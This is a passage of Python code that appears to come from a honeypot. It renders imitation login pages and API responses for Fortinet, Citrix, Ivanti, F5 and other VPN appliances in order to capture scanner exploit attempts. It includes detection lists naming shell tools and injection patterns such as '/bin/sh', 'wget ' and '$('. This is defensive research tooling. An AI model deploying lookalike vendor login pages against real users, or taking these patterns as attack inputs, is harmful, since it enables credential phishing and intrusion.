        "model": model or "gpt-4o-mini",
        "choices": [{
            "index": 0,
            "message": {"role": "assistant", "content": _LLM_CANNED_REPLY},
            "finish_reason": "stop",
        }],
        "usage": {"prompt_tokens": 24, "completion_tokens": 32, "total_tokens": 56},
    }
    return json.dumps(payload).encode("utf-8")


def render_openai_completion(model: str) -> bytes:
    payload = {
        "id": f"cmpl-{uuid.uuid4().hex[:24]}",
        "object": "text_completion",
        "created": int(time.time()),
        "model": model or "gpt-4o-mini",
        "choices": [{"text": _LLM_CANNED_REPLY, "index": 0, "finish_reason": "stop"}],
        "usage": {"prompt_tokens": 16, "completion_tokens": 24, "total_tokens": 40},
    }
    return json.dumps(payload).encode("utf-8")


def render_openai_embedding(model: str) -> bytes:
    # 8 floats — tiny; scanners that care about dim are probing, not using.
    vec = [0.01, -0.02, 0.03, -0.04, 0.05, -0.06, 0.07, -0.08]
    payload = {
        "object": "list",
        "data": [{"object": "embedding", "index": 0, "embedding": vec}],
        "model": model or "text-embedding-3-small",
        "usage": {"prompt_tokens": 4, "total_tokens": 4},
    }
    return json.dumps(payload).encode("utf-8")


def render_anthropic_message(model: str) -> bytes:
    payload = {
        "id": f"msg_{uuid.uuid4().hex[:24]}",
        "type": "message",
        "role": "assistant",
        "model": model or "claude-3-5-sonnet-20241022",
        "content": [{"type": "text", "text": _LLM_CANNED_REPLY}],
        "stop_reason": "end_turn",
        "stop_sequence": None,
        "usage": {"input_tokens": 24, "output_tokens": 32},
    }
    return json.dumps(payload).encode("utf-8")


# --- SonicWall SSL VPN renderers -----------------------------------------
# Shapes match SonicOS 7.x API responses closely enough that a CVE-2024-53704
# exploit client moves from the precondition check into the auth POST.
# We don't need to mint a real session — the scanner's next payload is the
# intel we want, and SonicOS's success envelope is simple enough to fake.




def render_cisco_webvpn_logon_html(host: str) -> bytes:
    body = f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>SSL VPN Service</title>
  <script src="/+CSCOE+/logon_forms.js"></script>
</head>
<body>
  <h1>Secure Access SSL VPN</h1>
  <form method="post" action="/+webvpn+/index.html">
    <input type="text" name="username" autocomplete="username" />
    <input type="password" name="password" autocomplete="current-password" />
    <input type="hidden" name="group_list" value="DefaultWEBVPNGroup" />
    <button type="submit">Login</button>
  </form>
  <small>Host: {host or "vpn-gateway"}</small>
</body>
</html>
"""
    return body.encode("utf-8")


def render_cisco_webvpn_logon_forms_js() -> bytes:
    return b"""(function(){\nwindow.webvpn={validate:function(){return true;},version:"9.18.2"};\n})();\n"""


def render_cisco_webvpn_jar_stub(name: str) -> bytes:
    return f"PK\x03\x04{name}-placeholder".encode("utf-8")


def render_cisco_anyconnect_config_auth(host: str) -> bytes:
    gateway = host or "vpn-gateway"
    body = f"""<?xml version="1.0" encoding="UTF-8"?>
<config-auth client="vpn" type="auth-request" aggregate-auth-version="2">
  <auth id="main">
    <title>SSL VPN Service</title>
    <message>Please enter your username and password.</message>
    <form method="post" action="/+CSCOE+/logon.html">
      <input type="text" name="username" label="Username"/>
      <input type="password" name="password" label="Password"/>
      <input type="submit" name="Login" value="Login"/>
    </form>
  </auth>
  <host>{gateway}</host>
</config-auth>
"""
    return body.encode("utf-8")


def render_ivanti_welcome_html(host: str) -> bytes:
    safe_host = host or "ivanti-vpn"
    body = f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Ivanti Connect Secure</title>
  <link rel="stylesheet" type="text/css" href="/dana-na/css/ds.css" />
</head>
<body class="welcome-bg">
  <div id="welcomePage">
    <h1>Welcome to {safe_host}</h1>
    <form name="frmLogin" method="post" action="/dana-na/auth/url_default/login.cgi">
      <input type="hidden" name="tz_offset" value="0" />
      <input type="hidden" name="realm" value="Users" />
      <label>Username</label>
      <input type="text" name="username" autocomplete="username" />
      <label>Password</label>
      <input type="password" name="password" autocomplete="current-password" />
      <button type="submit" name="btnSubmit">Sign In</button>
    </form>
    <small>Secure Access</small>
  </div>
</body>
</html>
"""
    return body.encode("utf-8")


def render_ivanti_login_post(dsid: str) -> bytes:
    body = f"""<!doctype html>
<html><head><title>Authenticated</title>
<meta http-equiv="refresh" content="0; url=/dana/home/index.cgi" />
</head><body>
<p>Redirecting...</p>
<script>document.cookie="DSID={dsid}; path=/; secure";</script>
</body></html>
"""
    return body.encode("utf-8")


def render_ivanti_hostchecker_stub(name: str) -> bytes:
    # Real HostCheckerInstaller payloads are platform binaries (Mach-O / PE
    # / DMG). Returning a magic-bytes-prefixed stub is enough to keep
    # banner-grab probes happy without serving anything executable.
    suffix = name.lower().rsplit(".", 1)[-1]
    if suffix == "exe":
        prefix = b"MZ\x90\x00"  # PE/COFF DOS header magic
    elif suffix == "dmg":
        prefix = b"koly"        # DMG trailer magic (placed up front, harmless)
    else:
        prefix = b"\xcf\xfa\xed\xfe"  # Mach-O 64-bit little-endian magic
    return prefix + f"-ivanti-{name}-placeholder".encode("utf-8")


def render_ivanti_namedusers_json() -> bytes:
    # `/dana-ws/namedusers` is the REST surface where CVE-2024-21887 command
    # injection POSTs land. A live Ivanti returns a JSON envelope here when
    # auth is missing; we return a plausible empty list so the scanner ships
    # the exploit body anyway and we capture it.
    payload = {
        "result": "success",
        "data": {
            "users": [],
            "total": 0,
        },
    }
    return json.dumps(payload).encode("utf-8")


def render_fortigate_login_html(host: str, version: str, build: str) -> bytes:
    """FortiOS SSL VPN login landing.

    Real FortiOS serves a heavily-obfuscated login.js bundle and a small
    HTML scaffold that posts to /remote/logincheck. We return the
    scaffold + a comment carrying the version banner — enough that
    fingerprint scrapers (which usually grep for `FortiGate` and a build
    number, not bytewise diff against a real device) move on to the
    second-stage probe.
    """
    safe_host = host or "fortigate"
    body = f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
  <title>Please Login</title>
  <link rel="icon" href="/remote/fgt_favicon" />
  <link rel="stylesheet" href="/remote/fgt_lang?lang=en" />
  <!-- FortiGate / FortiOS {version}, build {build} -->
</head>
<body class="fortinet-login">
  <div id="header">
    <img src="/remote/fortinet.png" alt="FortiGate" />
  </div>
  <div id="main">
    <form name="f" method="post" action="/remote/logincheck" autocomplete="off">
      <input type="hidden" name="ajax" value="1" />
      <input type="hidden" name="realm" value="" />
      <table>
        <tr><td>Name:</td><td><input type="text" name="username" /></td></tr>
        <tr><td>Password:</td><td><input type="password" name="credential" /></td></tr>
      </table>
      <button type="submit">Login</button>
    </form>
  </div>
  <div id="footer">
    <small>{safe_host}</small>
  </div>
</body>
</html>
"""
    return body.encode("utf-8")


def render_fortigate_logincheck() -> bytes:
    """Body returned for /remote/logincheck.

    Real FortiOS replies with a short `ret=N,redir=...` text/plain blob
    after evaluating the credential. We always emit auth-failure so the
    scanner moves on (and ships any follow-on auth-bypass body); the
    session cookie is set in the handler — minted per-request, never a
    fixed literal.
    """
    return b"ret=1,redir=/remote/login&error=1\r\n"


def render_fortigate_lang_stub() -> bytes:
    # Real `fgt_lang?lang=en` returns a JSON map of UI strings. Returning
    # an empty object is plausible enough for fingerprint scrapers.
    return b"{}\n"


def render_fortigate_error_html(host: str) -> bytes:
    safe_host = host or "fortigate"
    body = f"""<!doctype html>
<html><head><title>Error</title></head>
<body><div id="err">An error occurred. <a href="/remote/login?lang=en">Return to login</a></div>
<small>{safe_host}</small>
</body></html>
"""
    return body.encode("utf-8")


def render_fortigate_admin_json(version: str, build: str) -> bytes:
    """`/api/v2/cmdb/system/admin` — REST admin enumeration.

    Real FortiOS returns 401 here without a session token; we emit a
    canonical "permission_denied" envelope so scanners know the path is
    live and ship a follow-on auth-bypass / token-replay attempt.
    """
    payload = {
        "http_method": "GET",
        "revision": uuid.uuid4().hex,
        "results": [],
        "vdom": "root",
        "path": "system",
        "name": "admin",
        "status": "error",
        "error": -11,
        "http_status": 401,
        "version": f"v{version}",
        "build": int(build) if build.isdigit() else build,
    }
    return json.dumps(payload).encode("utf-8")


def render_fortigate_status_json(host: str, version: str, build: str) -> bytes:
    """`/api/v2/cmdb/system/status` — version banner.

    Public on real FortiOS pre-auth in some configs; banner-grab probes
    sometimes skip the login HTML and go straight here.
    """
    safe_host = host or "fortigate"
    payload = {
        "http_method": "GET",
        "results": {
            "version": f"v{version}",
            "build": int(build) if build.isdigit() else build,
            "branch_point": build,
            "release_version_information": f"FortiGate-VM64 v{version}",
            "serial": "FGVM" + uuid.uuid4().hex[:12].upper(),
            "hostname": safe_host,
            "model": "FortiGate-VM64",
            "model_name": "FortiGate",
        },
        "vdom": "root",
        "path": "system",
        "name": "status",
        "status": "success",
        "http_status": 200,
        "version": f"v{version}",
    }
    return json.dumps(payload).encode("utf-8")


def render_fortigate_router_policy_json() -> bytes:
    """`/api/v2/monitor/router/policy` — empty policy table envelope."""
    payload = {
        "http_method": "GET",
        "results": [],
        "vdom": "root",
        "path": "router",
        "name": "policy",
        "action": "select",
        "status": "success",
        "serial": "FGVM" + uuid.uuid4().hex[:12].upper(),
        "version": "v7.4.4",
        "build": 2662,
    }
    return json.dumps(payload).encode("utf-8")


def extract_fortigate_logincheck_form(body: bytes, content_type: str) -> tuple[str, bool]:
    """Pull `username` and check for credential / password presence.

    FortiOS logincheck uses field names `username` + `credential`.
    Real Forti deployments are seen with both `credential` and the
    generic `password` in the wild, so we accept either.
    """
    form = parse_form_body(body, content_type)
    username = ""
    for key in ("username", "user", "login"):
        values = form.get(key) or form.get(key.upper())
        if values and values[0]:
            username = values[0][:120]
            break
    has_password = any(
        bool((form.get(key) or form.get(key.upper()) or [""])[0])
        for key in ("credential", "password", "pass", "passwd")
    )
    return username, has_password


_FORTIGATE_CMD_INJECTION_INDICATORS = (
    ";",
    "|",
    "&&",
    "$(",
    "`",
    "/bin/sh",
    "/bin/bash",
    "wget ",
    "curl ",
    "../",
    # CVE-2024-21762 PoC bodies frequently embed the heap-overflow
    # marker in a multipart boundary or in a magic Forti-auth header
    # value.
    "fgt_lang",
    "param_str",
)


def _fortigate_has_cmd_injection(body_preview: str, query: str) -> bool:
    haystack = f"{query} {body_preview}".lower()
    return any(needle in haystack for needle in _FORTIGATE_CMD_INJECTION_INDICATORS)


# ---- GlobalProtect renderers ------------------------------------------------

def render_globalprotect_prelogin_xml(version: str) -> bytes:
    return (
        '<?xml version="1.0" encoding="UTF-8" ?>\n'
        "<prelogin-cookie>\n"
        f"  <status>0</status>\n"
        f"  <ccusername></ccusername>\n"
        f"  <autosubmit>false</autosubmit>\n"
        f"  <msg></msg>\n"
        f"  <newmsg></newmsg>\n"
        f"  <authentication-message>Please login to continue</authentication-message>\n"
        f"  <username-label>Username</username-label>\n"
        f"  <password-label>Password</password-label>\n"
        f"  <panos-version>{version}</panos-version>\n"
        f"  <region>Americas</region>\n"
        "</prelogin-cookie>\n"
    ).encode("utf-8")


def render_globalprotect_login_html(host: str) -> bytes:
    safe_host = host or "globalprotect"
    return (
        "<!DOCTYPE html>\n<html><head>\n"
        f"<title>GlobalProtect Portal - {safe_host}</title>\n"
        "</head><body>\n"
        '<div id="portal-login">\n'
        '<form method="post" action="/global-protect/login.esp">\n'
        '<input type="text" name="user" placeholder="Username" />\n'
        '<input type="password" name="passwd" placeholder="Password" />\n'
        '<input type="hidden" name="inputStr" />\n'
        '<button type="submit">Log In</button>\n'
        "</form>\n</div>\n"
        "</body></html>\n"
    ).encode("utf-8")


def render_globalprotect_getconfig_xml(host: str, version: str) -> bytes:
    safe_host = host or "globalprotect"
    return (
        '<?xml version="1.0" encoding="UTF-8" ?>\n'
        "<response>\n"
        f"  <portal>{safe_host}</portal>\n"
        f"  <user></user>\n"
        f"  <gateways>\n"
        f"    <external>\n"
        f"      <list>\n"
        f"        <entry name=\"{safe_host}-gw\">\n"
        f"          <description>{safe_host} Gateway</description>\n"
        f"          <priority>1</priority>\n"
        f"        </entry>\n"
        f"      </list>\n"
        f"    </external>\n"
        f"  </gateways>\n"
        "</response>\n"
    ).encode("utf-8")


def extract_globalprotect_form(body: bytes, content_type: str) -> tuple[str, bool]:
    if not body:
        return "", False
    text = body.decode("utf-8", errors="replace")
    username = ""
    has_password = False
    for part in text.split("&"):
        if "=" not in part:
            continue
        key, _, val = part.partition("=")
        key = unquote(key.strip().lower())
        val = unquote(val.strip())
        if key == "user":
            username = val[:200]
        elif key == "passwd" and val:
            has_password = True
    return username, has_password


# ---- Sophos SSL VPN renderers -----------------------------------------------

def render_sophos_vpn_login_html(host: str) -> bytes:
    safe_host = host or "sophos-xg"
    return (
        "<!DOCTYPE html>\n<html><head>\n"
        f"<title>Sophos Firewall - {safe_host}</title>\n"
        '<meta name="viewport" content="width=device-width, initial-scale=1" />\n'
        "</head><body>\n"
        '<div id="login-container">\n'
        '<h2>SSL VPN Login</h2>\n'
        '<form method="post" action="/svpn/index.cgi">\n'
        '<input type="text" name="username" placeholder="Username" />\n'
        '<input type="password" name="password" placeholder="Password" />\n'
        '<input type="hidden" name="ajax" value="1" />\n'
        '<button type="submit">Login</button>\n'
        "</form>\n</div>\n"
        "</body></html>\n"
    ).encode("utf-8")


def extract_sophos_form(body: bytes, content_type: str) -> tuple[str, bool]:
    if not body:
        return "", False
    text = body.decode("utf-8", errors="replace")
    username = ""
    has_password = False
    for part in text.split("&"):
        if "=" not in part:
            continue
        key, _, val = part.partition("=")
        key = unquote(key.strip().lower())
        val = unquote(val.strip())
        if key == "username":
            username = val[:200]
        elif key == "password" and val:
            has_password = True
    return username, has_password


# ---- Barracuda SSL VPN renderers --------------------------------------------

def render_barracuda_vpn_negotiation() -> bytes:
    return (
        "HTTP/1.1 200 OK\r\n"
        "X-Barracuda-VPN: enabled\r\n"
        "Content-Type: text/plain\r\n\r\n"
        "CONNECT\r\n"
        "ipv4=1\r\n"
        "ipv6=1\r\n"
        "hdlc_framing=no\r\n"
        "Z=deflate\r\n"
    ).encode("utf-8")


def render_barracuda_login_html(host: str) -> bytes:
    safe_host = host or "barracuda"
    return (
        "<!DOCTYPE html>\n<html><head>\n"
        f"<title>Barracuda SSL VPN - {safe_host}</title>\n"
        "</head><body>\n"
        '<div id="vpn-login">\n'
        '<h2>Barracuda Networks SSL VPN</h2>\n'
        '<form method="post" action="/cgi-mod/index.cgi">\n'
        '<input type="text" name="username" placeholder="Username" />\n'
        '<input type="password" name="password" placeholder="Password" />\n'
        '<button type="submit">Log In</button>\n'
        "</form>\n</div>\n"
        "</body></html>\n"
    ).encode("utf-8")


# ---- F5 BIG-IP APM renderers ------------------------------------------------

def render_f5_my_policy_html(host: str, version: str) -> bytes:
    safe_host = host or "bigip"
    return (
        "<!DOCTYPE html>\n<html><head>\n"
        f"<title>BIG-IP - {safe_host}</title>\n"
        "</head><body>\n"
        '<div id="access-policy">\n'
        '<h2>BIG-IP Access Policy</h2>\n'
        '<form method="post" action="/my.policy">\n'
        '<input type="text" name="username" placeholder="Username" />\n'
        '<input type="password" name="password" placeholder="Password" />\n'
        '<input type="hidden" name="vhost" value="standard" />\n'
        '<button type="submit">Logon</button>\n'
        "</form>\n</div>\n"
        f"<!-- F5 BIG-IP {version} -->\n"
        "</body></html>\n"
    ).encode("utf-8")


def render_f5_tmui_login_html(host: str, version: str) -> bytes:
    safe_host = host or "bigip"
    return (
        "<!DOCTYPE html>\n<html><head>\n"
        f"<title>BIG-IP&reg; Configuration Utility</title>\n"
        "</head><body>\n"
        '<div id="main_table">\n'
        '<form method="post" action="/tmui/logmein.html">\n'
        '<input type="text" name="username" placeholder="Username" />\n'
        '<input type="password" name="passwd" placeholder="Password" />\n'
        '<button type="submit">Log in</button>\n'
        "</form>\n</div>\n"
        f"<!-- BIG-IP {version} -->\n"
        "</body></html>\n"
    ).encode("utf-8")


def render_f5_sslvpnclient_xml() -> bytes:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        "<sslvpn>\n"
        "  <status>enabled</status>\n"
        "  <protocol>3</protocol>\n"
        "  <platform>mac</platform>\n"
        "  <ipv4>1</ipv4>\n"
        "  <ipv6>1</ipv6>\n"
        "</sslvpn>\n"
    ).encode("utf-8")


# --- Docker Registry V2 API renderers ------------------------------------

def render_docker_registry_catalog() -> bytes:
    payload = {"repositories": list(_DOCKER_REGISTRY_REPOS)}
    return json.dumps(payload, separators=(",", ":")).encode("utf-8")


def render_docker_registry_tags(repo: str) -> bytes:
    payload = {"name": repo, "tags": ["latest", "v1.2.3", "stable", "main"]}
    return json.dumps(payload, separators=(",", ":")).encode("utf-8")


def render_docker_registry_manifest(repo: str, ref: str) -> bytes:
    config_digest = "sha256:" + hashlib.sha256(
        f"config-{repo}-{ref}".encode()
    ).hexdigest()
    layer_digest = "sha256:" + hashlib.sha256(
        f"layer-{repo}-{ref}-0".encode()
    ).hexdigest()
    manifest = {
        "schemaVersion": 2,
        "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
        "config": {
            "mediaType": "application/vnd.docker.container.image.v1+json",
            "size": 1470,
            "digest": config_digest,
        },
        "layers": [
            {
                "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
                "size": 27098240,
                "digest": layer_digest,
            },
        ],
    }
    return json.dumps(manifest, separators=(",", ":")).encode("utf-8")


def extract_f5_form(body: bytes, content_type: str) -> tuple[str, bool]:
    if not body:
        return "", False
    text = body.decode("utf-8", errors="replace")
    username = ""
    has_password = False
    for part in text.split("&"):
        if "=" not in part:
            continue
        key, _, val = part.partition("=")
        key = unquote(key.strip().lower())
        val = unquote(val.strip())
        if key in ("username", "user"):
            username = val[:200]
        elif key in ("password", "passwd") and val:
            has_password = True
    return username, has_password


def render_citrix_gateway_index_html(host: str, version: str) -> bytes:
    """Citrix NetScaler / Gateway VPN portal landing.

    Real NetScaler ADC ships a heavily-bundled `gateway_login_*.js` blob
    under `/vpn/index.html` plus the form scaffold that posts to
    `/cgi/login`. We return the scaffold + a banner comment carrying the
    NS build — enough for fingerprint scrapers (which grep for `NetScaler`
    / `NS<version>` rather than diff bytes) to move on to the credential
    POST or the CVE-2019-19781 path-traversal probe.
    """
    safe_host = host or "citrix-gateway"
    body = f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
  <title>NetScaler Gateway</title>
  <link rel="icon" href="/vpn/images/AccessGateway.ico" />
  <link rel="stylesheet" href="/vpn/js/rdx/core/lang/rdx_en.json.gz" />
  <!-- {version} -->
</head>
<body class="ns-gateway-login">
  <div id="loginContainer">
    <h1>NetScaler Gateway</h1>
    <form name="vpn" method="post" action="/cgi/login" autocomplete="off">
      <input type="hidden" name="dummy_username" value="ctx_dummy_username" />
      <input type="hidden" name="dummy_password1" value="ctx_dummy_password1" />
      <label>User name</label>
      <input type="text" name="login" autocomplete="username" />
      <label>Password</label>
      <input type="password" name="passwd" autocomplete="current-password" />
      <button type="submit" name="loginBtn">Log On</button>
    </form>
  </div>
  <div id="footer"><small>{safe_host}</small></div>
</body>
</html>
"""
    return body.encode("utf-8")


def render_citrix_logonpoint_html(host: str, version: str) -> bytes:
    """Citrix StoreFront / Gateway `/logon/LogonPoint/index.html` landing.

    Differs from `/vpn/index.html` only in framing — same form contract.
    """
    safe_host = host or "citrix-gateway"
    body = f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Logon Point</title>
  <!-- {version} -->
</head>
<body class="ns-logonpoint">
  <div id="logonbox">
    <h1>Please log on</h1>
    <form method="post" action="/cgi/login" autocomplete="off">
      <label>User name</label>
      <input type="text" name="login" autocomplete="username" />
      <label>Password</label>
      <input type="password" name="passwd" autocomplete="current-password" />
      <button type="submit">Log On</button>
    </form>
  </div>
  <div id="footer"><small>{safe_host}</small></div>
</body>
</html>
"""
    return body.encode("utf-8")


def render_citrix_xenapp_login_html(host: str) -> bytes:
    """`/Citrix/XenApp/auth/login.aspx` — XenApp StoreFront login form.

    CVE-2022-27510 (auth bypass, CVSS 9.8) and CVE-2023-24486 (session
    hijacking) bait. The form posts to `loginauth.aspx` on real
    deployments; we accept both the GET landing here and any POST that
    lands on `/cgi/login` or this same path.
    """
    safe_host = host or "citrix-storefront"
    body = f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Citrix XenApp - Logon</title>
</head>
<body class="xenapp-login">
  <div id="logonbox">
    <h1>Citrix XenApp</h1>
    <form method="post" action="/Citrix/XenApp/auth/login.aspx" autocomplete="off">
      <label>User name</label>
      <input type="text" name="user" autocomplete="username" />
      <label>Password</label>
      <input type="password" name="password" autocomplete="current-password" />
      <input type="hidden" name="domain" value="" />
      <button type="submit">Log On</button>
    </form>
  </div>
  <div id="footer"><small>{safe_host}</small></div>
</body>
</html>
"""
    return body.encode("utf-8")


def render_citrix_rdx_lang_stub() -> bytes:
    # Real NetScaler returns a gzipped JSON map of UI-string keys here.
    # Returning a tiny gzip-shaped JSON envelope keeps fingerprint scrapers
    # happy without serving anything that decodes to executable JS.
    return b'{"locale":"en","strings":{}}\n'


def render_citrix_login_post(login_value: str) -> bytes:
    """`/cgi/login` and `/p/u/doAuthentication.do` POST response.

    Real NetScaler emits a small XML/script blob with a redirect target
    when auth fails. We always return a generic auth-failure scaffold so
    the scanner moves on (ships any session-replay / CitrixBleed payload
    in a follow-up). The session cookie is set in the handler — minted
    per-request, never a fixed literal.
    """
    safe_login = login_value[:80] if login_value else ""
    body = f"""<!doctype html>
<html><head><title>Logon</title></head>
<body>
<script>
  document.location = "/vpn/index.html?error=1";
</script>
<noscript>Logon failed for {safe_login}</noscript>
</body></html>
"""
    return body.encode("utf-8")


def extract_citrix_gateway_form(body: bytes, content_type: str) -> tuple[str, bool]:
    """Pull `login` / `user` and check for password presence.

    Real Citrix POSTs use `login` + `passwd`; XenApp login.aspx uses
    `user` + `password`. Accept either to cover both variants.
    """
    form = parse_form_body(body, content_type)
    username = ""
    for key in ("login", "user", "username", "user_name"):
        values = form.get(key) or form.get(key.upper())
        if values and values[0]:
            username = values[0][:120]
            break
    has_password = any(
        bool((form.get(key) or form.get(key.upper()) or [""])[0])
        for key in ("passwd", "password", "pass", "credential")
    )
    return username, has_password


_CITRIX_CMD_INJECTION_INDICATORS = (
    # CVE-2019-19781 path-traversal pattern (`/vpn/../vpns/portal/...`)
    "/../",
    "%2f..",
    "..%2f",
    # Generic shell-meta indicators (NetScaler perl/sh sinks)
    ";",
    "|",
    "&&",
    "$(",
    "`",
    "/bin/sh",
    "/bin/bash",
    "wget ",
    "curl ",
    # CitrixBleed (CVE-2023-4966) heap leaks tend to surface in the host
    # header on follow-on requests; the indicator we flag here covers
    # the path-traversal exploit chain. CitrixBleed cookie-replay is
    # caught separately by the cookie name on the next hit.
)


def _citrix_has_cmd_injection(body_preview: str, path: str, query: str) -> bool:
    haystack = f"{path} {query} {body_preview}".lower()
    return any(needle in haystack for needle in _CITRIX_CMD_INJECTION_INDICATORS)


def render_rdweb_login_html(host: str, server_build: str) -> bytes:
    """Microsoft RDWeb (RD Web Access) login page.

    Real Server 2019 RDWeb on `/RDWeb/Pages/en-US/login.aspx` ships an
    ASP.NET WebForms HTML scaffold with `__VIEWSTATE` and posts back to
    the same URL. We return a stripped scaffold with a per-request
    placeholder VIEWSTATE so the form looks plausible to scanners that
    parse the HTML and submit. The `Server: Microsoft-IIS/10.0` header
    is set by the handler.
    """
    safe_host = host or "rdweb"
    viewstate = uuid.uuid4().hex
    body = f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <title>RD Web Access</title>
  <link rel="stylesheet" type="text/css" href="/RDWeb/Pages/Site.css" />
</head>
<body class="rdweb">
  <div id="header">
    <h1>Work Resources</h1>
    <h2>RemoteApp and Desktop Connection</h2>
  </div>
  <form method="post" action="/RDWeb/Pages/en-US/login.aspx" autocomplete="off">
    <input type="hidden" name="__VIEWSTATE" value="{viewstate}" />
    <input type="hidden" name="WorkSpaceID" value="" />
    <input type="hidden" name="RDPCertificates" value="" />
    <label>Domain\\user name</label>
    <input type="text" name="DomainUserName" autocomplete="username" />
    <label>Password</label>
    <input type="password" name="UserPass" autocomplete="current-password" />
    <input type="hidden" name="MachineType" value="private" />
    <button type="submit" name="btnSubmit" value="Sign in">Sign in</button>
  </form>
  <div id="footer">
    <small>Windows Server {server_build} · {safe_host}</small>
  </div>
</body>
</html>
"""
    return body.encode("utf-8")


def render_rdweb_default_html(host: str) -> bytes:
    """Post-auth RDWeb desktop list. Real Server 2019 returns the
    `RemoteApp and Desktop Connections` panel here when a session cookie
    is present. We return an empty panel so any follow-on RDP descriptor
    fetch (`rdp.aspx`, `rdpobject.aspx`) lands in the access log without
    a useful payload reaching the scanner.
    """
    safe_host = host or "rdweb"
    body = f"""<!doctype html>
<html lang="en"><head><title>RemoteApp and Desktop Connection</title></head>
<body><div id="resourceList"><p>No resources are currently available.</p></div>
<small>{safe_host}</small></body></html>
"""
    return body.encode("utf-8")


def extract_rdweb_form(body: bytes, content_type: str) -> tuple[str, bool]:
    """Pull `DomainUserName` and check for `UserPass` presence.

    Real RDWeb form names are CamelCase; some scanners send
    lowercased variants — accept both.
    """
    form = parse_form_body(body, content_type)
    username = ""
    for key in ("DomainUserName", "domainusername", "username", "UserName"):
        values = form.get(key) or form.get(key.lower()) or form.get(key.upper())
        if values and values[0]:
            username = values[0][:120]
            break
    has_password = any(
        bool((form.get(key) or form.get(key.lower()) or form.get(key.upper()) or [""])[0])
        for key in ("UserPass", "userpass", "password", "Password")
    )
    return username, has_password


def render_aspera_faspex_landing(host: str, version: str) -> bytes:
    safe_host = host or "faspex-gateway"
    body = f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>IBM Aspera Faspex</title>
</head>
<body>
  <div id="login-container">
    <h1>IBM Aspera Faspex</h1>
    <p class="version">Version {version}</p>
    <form method="post" action="/aspera/faspex/session">
      <label>Username</label>
      <input type="text" name="user[email]" autocomplete="username" />
      <label>Password</label>
      <input type="password" name="user[password]" autocomplete="current-password" />
      <button type="submit">Sign In</button>
    </form>
  </div>
  <small>Node: {safe_host}</small>
</body>
</html>
"""
    return body.encode("utf-8")


def render_aspera_logout_json() -> bytes:
    payload = {
        "status": "ok",
        "message": "signed out",
        "csrf": uuid.uuid4().hex,
    }
    return json.dumps(payload).encode("utf-8")


def extract_ivanti_form(body: bytes, content_type: str) -> tuple[str, bool]:
    form = parse_form_body(body, content_type)
    username = ""
    for key in ("username", "user", "login"):
        values = form.get(key) or form.get(key.upper())
        if values and values[0]:
            username = values[0][:120]
            break
    has_password = any(bool((form.get(key) or form.get(key.upper()) or [""])[0]) for key in ("password", "pass"))
    return username, has_password


_IVANTI_CMD_INJECTION_INDICATORS = (
    ";",
    "|",
    "&&",
    "$(",
    "`",
    "/bin/sh",
    "/bin/bash",
    "wget ",
    "curl ",
    "../",
)


def _ivanti_has_cmd_injection(body_preview: str, query: str) -> bool:
    haystack = f"{query} {body_preview}".lower()
    return any(needle in haystack for needle in _IVANTI_CMD_INJECTION_INDICATORS)


def render_geoserver_landing(host: str, version: str) -> bytes:
    """HTML landing for /geoserver/web/ — mimics GeoServer 2.x admin UI shell.

    Apache Wicket markup is intentionally close to the upstream login.html
    so wicket-aware scanners follow into AboutGeoServerPage / Demos."""
    safe_host = host or "geoserver.internal"
    body = f"""<!doctype html>
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
  <meta charset="utf-8" />
  <title>GeoServer: Welcome</title>
  <link rel="stylesheet" type="text/css" href="/geoserver/wicket/resource/org.geoserver.web.GeoServerBasePage/css/blueprint/screen.css" />
</head>
<body class="page">
  <div id="page">
    <div id="header">
      <a href="/geoserver/web/"><h1>GeoServer</h1></a>
      <span id="serverVersion">Version {version}</span>
    </div>
    <div id="loginform">
      <form method="post" action="/geoserver/j_spring_security_check">
        <fieldset>
          <legend>Login</legend>
          <label for="username">User:</label>
          <input type="text" id="username" name="username" autocomplete="username" />
          <label for="password">Password:</label>
          <input type="password" id="password" name="password" autocomplete="current-password" />
          <button type="submit" name="submit">Login</button>
        </fieldset>
      </form>
    </div>
    <div id="demos">
      <h2>About &amp; Status</h2>
      <ul>
        <li><a href="/geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage">About GeoServer</a></li>
        <li><a href="/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.DemoRequestsPage">Demo requests</a></li>
        <li><a href="/geoserver/web/wicket/bookmarkable/org.geoserver.web.LayerPreviewPage">Layer preview</a></li>
      </ul>
      <h2>Service Capabilities</h2>
      <ul>
        <li><a href="/geoserver/ows?service=wfs&amp;version=2.0.0&amp;request=GetCapabilities">WFS 2.0.0</a></li>
        <li><a href="/geoserver/ows?service=wms&amp;version=1.3.0&amp;request=GetCapabilities">WMS 1.3.0</a></li>
        <li><a href="/geoserver/ows?service=wcs&amp;version=2.0.1&amp;request=GetCapabilities">WCS 2.0.1</a></li>
      </ul>
    </div>
    <div id="footer">
      <p>GeoServer {version} on {safe_host} &mdash; <a href="/geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage">about</a></p>
    </div>
  </div>
</body>
</html>
"""
    return body.encode("utf-8")


def render_geoserver_about(host: str, version: str) -> bytes:
    """About page — visited as the CVE-2024-36401 trigger surface. Server
    responds with a plausible Wicket-rendered AboutGeoServerPage so scanners
    that fingerprint on the response body proceed to ship the exploit."""
    safe_host = host or "geoserver.internal"
    body = f"""<!doctype html>
<html lang="en">
<head><meta charset="utf-8" /><title>About GeoServer</title></head>
<body class="page">
  <h1>About GeoServer</h1>
  <table>
    <tr><th>Version</th><td>{version}</td></tr>
